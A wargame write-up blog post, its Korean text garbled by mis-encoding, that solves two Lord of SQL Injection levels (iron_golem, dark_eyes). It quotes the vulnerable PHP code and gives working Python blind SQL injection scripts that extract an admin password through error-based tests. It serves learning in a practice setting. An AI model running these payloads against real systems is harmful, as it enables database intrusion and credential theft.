---
title: "[LOS] 21,22ë²ˆ ë¬¸ì œ í’€ì´(iron_golem,dark_eyes)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 21ë²ˆ
  - los 22ë²ˆ
  - los iron_golem
  - los dark_eyes

  
toc: true
toc_sticky: true
toc_label: "21,22ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 21ë²ˆ, 22ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}



# 21ë²ˆ(iron_golem)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158185281-3052c8f2-242e-4987-9609-0312cf6ff47f.png)

```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit(mysqli_error($db));
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

## í’€ì´
21ë²ˆ ë¬¸ì œëŠ” ì´ì „ ë¬¸ì œë“¤ê³¼ ë‹¤ë¥´ê²Œ í™”ë©´ì— ì¶œë ¥ë˜ëŠ” ê°’ì´ ì—†ìŠµë‹ˆë‹¤. ì¦‰ ì„œë²„ë¡œ ì¸ì ì…˜ì„ ì‹œë„í•´ë„ ê·¸ ê²°ê³¼ê°’ì´ ì–´ë–»ê²Œ ì²˜ë¦¬ë˜ì—ˆëŠ”ì§€ë¥¼ ëª¨ë¥´ê¸° ë•Œë¬¸ì— ê¸°ì¡´ì˜ ë°©ë²•ê³¼ëŠ” ë‹¤ë¦…ë‹ˆë‹¤.

ì´ëŸ¬í•œ ê²½ìš°ì— ê°€ì¥ ë§ì´ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì´ Time Based Sql injectionì¸ë° ëŒ€í‘œì ì¸ í•¨ìˆ˜ sleepê³¼ benchmark ë‘ê°€ì§€ê°€ í•„í„°ë§ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ë‹¤ë¥¸ ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.

ëˆˆì— ë„ëŠ” ê²ƒì€ ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” Errorë¥¼ ì¶œë ¥ì„ í•´ì¤ë‹ˆë‹¤.

```sql
if(mysqli_error($db)) exit(mysqli_error($db));
```

ì´ë¥¼ ì´ìš©í•˜ë©´ blind sql injectionì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
ì¦‰, ë‚´ê°€ ì°¾ê³ ì í•˜ëŠ” ì¡°ê±´ì´ ì°¸ì´ë©´ - > ì—ëŸ¬ê°€ ì•ˆë‚˜ê²Œ í•˜ê³ , ê±°ì§“ì´ë©´ - > ì—ëŸ¬ë¥¼ ìœ ë°œí•˜ì—¬ ì°¸ ê±°ì§“ì„ íŒë‹¨í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— Blind SQL Injectionì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìœ„ì˜ ê°œë…ì„ ì ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì¡°ê±´ì— ë”°ë¼ì„œ í”„ë¡œê·¸ë¨ì˜ íë¦„(Flow)ê°€ ë‹¬ë¼ì§€ë„ë¡ í•˜ëŠ” í•¨ìˆ˜ë‚˜ ì—°ì‚°ìê°€ í•„ìš”í•©ë‹ˆë‹¤

mysql í•¨ìˆ˜ ë¬¸ì„œë¥¼ ë³´ë‹ˆ control flow ë¥¼ í•˜ëŠ” í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ í¬ê²Œ 2ê°€ì§€ë¡œ Case, Ifë¬¸ì´ ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158190060-e4e1c89a-9c66-4e2a-a497-bdf70a1e9284.png)

ì´ë²ˆ ë¬¸ì œëŠ” ë‘ ê°€ì§€ ì¡°ê±´ì´ ë‹¤ í•„í„°ë§ì´ ë˜ì–´ ìˆì§€ ì•Šìœ¼ë¯€ë¡œ ë‘ ì¡°ê±´ì„ ì´ìš©í•´ì„œ ë¬¸ì œë¥¼ í’€ì–´ë³´ê² ìŠµë‹ˆë‹¤.

### IF
**if êµ¬ë¬¸ ì‚¬ìš© ì˜ˆì œ**
```sql
IF(expr1,expr2,expr3)

# ë§Œì•½ expr1ì´ ì°¸ì´ë©´, expr2ë¥¼ ì‹¤í–‰í•˜ê³ , ê±°ì§“ì´ë©´ expr3ì„ ì‹¤í–‰í•œë‹¤.

IF(1=1,'true','false') # 'true' ì¶œë ¥
IF(1=2,'true','false') # 'false' ì¶œë ¥
```

ì°¸ì¸ ê²½ìš°ì—ëŠ” ì •ìƒ, ê±°ì§“ì¸ ê²½ìš°ì—ëŠ” ì—ëŸ¬ë¥¼ ì¼ìœ¼ì¼œì•¼ í•˜ë¯€ë¡œ ìš°ì„  ì—ëŸ¬ë¥¼ ì¼ìœ¼í‚¤ëŠ” êµ¬ë¬¸ì´ í•„ìš”í•©ë‹ˆë‹¤. ì—ëŸ¬ë¥¼ ì¼ìœ¼í‚¤ëŠ” ë°©ë²•ì€ ì •ë§ ë‹¤ì–‘í•˜ì§€ë§Œ ì €ëŠ” ì‰½ê²Œ pow(12341234,12341234)ì´ë ‡ê²Œ ì‘ì„±í•´ì„œ í—ˆìš©ê°€ëŠ¥í•œ ì—°ì‚° ë²”ìœ„ë¥¼ ì´ˆê³¼ì‹œì¼œì„œ ì—ëŸ¬ë¥¼ ë°œìƒì‹œì¼œ ë³´ê² ìŠµë‹ˆë‹¤.

ì„±ê³µì ìœ¼ë¡œ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158192370-509d9c2a-e5f9-43eb-bc07-dcbe63dd83b0.png)


ì´ì œ ë‹¤ìŒê³¼ ê°™ì´ blind sql injectionì„ ìˆ˜í–‰í•˜ë©´ ë©ë‹ˆë‹¤.

```python
for i in range(pw_length):
  for j in string.printable:
    pw="' or id='admin' and if(ascii(substr(pw,{},1))={},1,pow(12341234,12341234))#".format(i,ord(j))
```
ì´ë ‡ê²Œ í•˜ë©´ ì£¼ì–´ì§„ ì¡°ê±´ì´ ì°¸ì´ë¼ë©´ trueê°€ ì¶œë ¥ë˜ì–´ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šì„ ê²ƒì´ê³ , ì¡°ê±´ì´ ê±°ì§“ì´ë¼ë©´ pow(12341234,12341234)ê°€ ì‹¤í–‰ë˜ì–´ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

if ì¡°ê±´ì„ ì´ìš©í•œ blind sql injection ì „ì²´ ì†ŒìŠ¤ì½”ë“œì…ë‹ˆë‹¤.

```python
import requests

url= "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
params={'pw':None}
cookies = {'PHPSESSID':'1t87momi7f10m7tl6kkv6t0lob'}

for i in range(30,35):
    payload = "' or id='admin' and if(length(pw)={},1,pow(12341234,12341234))#".format(i)
    params['pw']=payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("DOUBLE value" not in response.text):
        print("find the pw_length",i)
        break

# ë¹„ë°€ë²ˆí˜¸ê°€ ê¸°ë‹ˆê¹Œ ì´ì§„íƒìƒ‰
flag = ''
for i in range(1,33):
    start,end= 0,255
    while True:
        search = int((start+end)/2)
        payload = "' or id='admin' and if(ascii(substr(pw,{},1))<={},1,pow(12341234,12341234))#".format(i,search)
        params['pw'] = payload
        print("[+]",payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("DOUBLE value" not in response.text):
            payload = "' or id='admin' and if(ascii(substr(pw,{},1))={},1,pow(12341234,12341234))#".format(i,search)
            params['pw'] = payload
            print("[+]",payload)
            response = requests.get(url,params=params,cookies=cookies)
            if("DOUBLE value" not in response.text):
                flag += chr(search)
                print("find the flag",flag)
                break
            end = search
        else:
            print("[-]",payload)
            start = search
```

![image](https://user-images.githubusercontent.com/33647663/158195555-34c30c7d-195e-402d-8623-4d2da6828330.png)

### Case
**Case êµ¬ë¬¸ ì‚¬ìš© ì˜ˆì œ**

```sql
CASE value WHEN compare_value THEN result [WHEN compare_value THEN result ...] [ELSE result] END

SELECT CASE 1 WHEN 1 THEN 'one'
         WHEN 2 THEN 'two' ELSE 'more' END;
# 'one' ì¶œë ¥

SELECT CASE 1+1 WHEN 1 THEN 'one'
         WHEN 2 THEN 'two' ELSE 'more' END;
# 'two' ì¶œë ¥


CASE WHEN condition THEN result [WHEN condition THEN result ...] [ELSE result] END

SELECT CASE WHEN 1>0 THEN 'true' ELSE 'false' END;
# 'true' ì¶œë ¥
```

Case êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ì—¬ pwë¥¼ ì•Œì•„ë‚´ëŠ” ì¿¼ë¦¬ëŠ” ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì„±í–ˆìŠµë‹ˆë‹¤.

```sql
pw=' or (select case when id='admin' and length(pw)=32 then 1 else pow(12341234,12341234) end)%23
```

ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ì¸ 32ë¥¼ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šì§€ë§Œ

![image](https://user-images.githubusercontent.com/33647663/158198121-7b0b4b81-77ff-4c01-8898-426777d649fa.png)

ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ê°€ ì•„ë‹Œ 31ì„ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤. ì¦‰ Case êµ¬ë¬¸ì„ ì´ìš©í•´ì„œë„ ì„±ê³µì ìœ¼ë¡œ blind sql injectionì´ ê°€ëŠ¥í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158198365-8d6562c8-1321-49fe-bcc8-4ee6dc4a7f9a.png)


# 22ë²ˆ(dark_eyes)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158279076-4a0f5370-a5dd-4cde-8b9c-dacd422c5256.png)

```php
<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

## í’€ì´
21ë²ˆê³¼ ë™ì¼í•œ ì¡°ê±´ì—ì„œ í•„í„°ë§ ë˜ëŠ” ì¡°ê±´ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤. flow controlì„ íŒë‹¨í•˜ëŠ” ì‹ì¸ if,caseê°€ í•„í„°ë§ ë˜ì–´ì„œ ë‹¤ë¥¸ ë°©ë²•ì„ í†µí•´ì„œ ì£¼ì–´ì§„ ì¡°ê±´ì— ëŒ€í•´ì„œ ì°¸/ê±°ì§“ì„ íŒë‹¨í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.

í˜„ì¬ í˜ì´ì§€ì—ì„œëŠ” ì˜¤ë¥˜ê°€ ë°œìƒí–ˆì„ ë•Œì™€ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šì„ë•Œ í™”ë©´ì˜ ì¶œë ¥ ê²°ê³¼ì—ì„œ ì°¨ì´ê°€ ë°œìƒí•©ë‹ˆë‹¤.


ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ í™”ë©´ì— ì•„ë¬´ê²ƒë„ ì¶œë ¥í•˜ì§€ ì•Šê³  

![image](https://user-images.githubusercontent.com/33647663/158279353-3d3f4714-ad6a-4f4a-bda1-20dbb19e37fa.png)

ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šìœ¼ë©´ ë‹¤ìŒê³¼ ê°™ì´ í™”ë©´ì´ ì¶œë ¥ë©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158279394-a3272919-5749-420b-9959-e11db09e2091.png)

ì´ë¥¼ ì´ìš©í•´ì„œ ì°¸ ì¼ë•Œ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ê³ , ê±°ì§“ì¼ ë•ŒëŠ” ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ì§€ ì•ŠëŠ” ë°©ë²•ì„ í†µí•´ì„œ ì°¸/ê±°ì§“ì„ íŒë‹¨í•˜ëŠ” ë°©ë²•ì„ ì´ìš©í•©ë‹ˆë‹¤.

ì œê°€ ì´ìš©í•œ ë°©ë²•ì€ sqlì—ì„œì˜ ì„œë¸Œì¿¼ë¦¬ë¥¼ ì´ìš©í•´ì„œ, ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ëŠ” ë°©ë²•ì…ë‹ˆë‹¤. ì•„ë˜ì˜ ì˜ˆì‹œ ì¿¼ë¦¬ë¥¼ ë³´ë©´ where ì¡°ê±´ì ˆì—ì„œ id=(ì„œë¸Œì¿¼ë¦¬) í˜•íƒœë¡œ ì¿¼ë¦¬ë¥¼ í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ë•Œ, ì„œë¸Œì¿¼ë¦¬ì—ì„œ ë¦¬í„´ë˜ëŠ” í–‰ì´ í•˜ë‚˜ì´ë©´, ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•Šì§€ë§Œ, í•œ ê°œ ì´ìƒì˜ í–‰ì´ ë¦¬í„´ë˜ë©´ ì—ëŸ¬ê°€ ë°œìƒí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158279800-5b707457-25bc-4471-8409-bed8e3bf7327.png)

ì´ë¥¼ ì´ìš©í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì°¸/ê±°ì§“ì„ íŒë‹¨í•©ë‹ˆë‹¤.

```sql
select id from prob_dark where id=(select 1 union select 2 where [ì¡°ê±´ ì‹])
```

![image](https://user-images.githubusercontent.com/33647663/158280189-d0a8449b-6ec9-4243-a946-f68c6c99aa2e.png)

**ìœ„ì˜ [ì¡°ê±´ì‹] ë¶€ë¶„ì—ì„œ ì¡°ê±´ì´ ì°¸ì´ ëœë‹¤ë©´, í–‰ì´ ì¶”ê°€ë¡œ ë°˜í™˜ë˜ì–´ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ê³ , ì¡°ê±´ì´ ê±°ì§“ì´ ëœë‹¤ë©´ í–‰ì´ ë°˜í™˜ë˜ì§€ ì•Šì•„ì„œ ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.!**

ì´ë¥¼ ì´ìš©í•´ì„œ blind sql injectionì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

```python
import requests
import string

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
params={'pw': None}
cookies = {'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'}

# ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ ì•Œì•„ë‚´ê¸°
for i in range(30):
    payload = "' or id=(select 1 union select 2 where id='admin' and length(pw)={})#".format(i)
    params['pw'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if(len(response.text)<5):
        print("find the pw_length",i)
        break

# ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ 8

# ë¹„ë°€ë²ˆí˜¸ ì°¾ê¸°
flag= ''
for i in range(1,9):
    for j in string.printable:
        payload = "' or id=(select 1 union select 2 where id='admin' and ascii(substr(pw,{},1))={})#".format(i,ord(j))
        params['pw'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if(len(response.text)<5):
            flag +=j
            print("find the flag",flag)
            break
```

ì‹¤í–‰ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë‚˜ì˜µë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158281261-ce31ed9e-8def-4946-96be-32ee29fbe327.png)

![image](https://user-images.githubusercontent.com/33647663/158281288-65132a20-00ab-47e9-9abc-d64cad2a0780.png)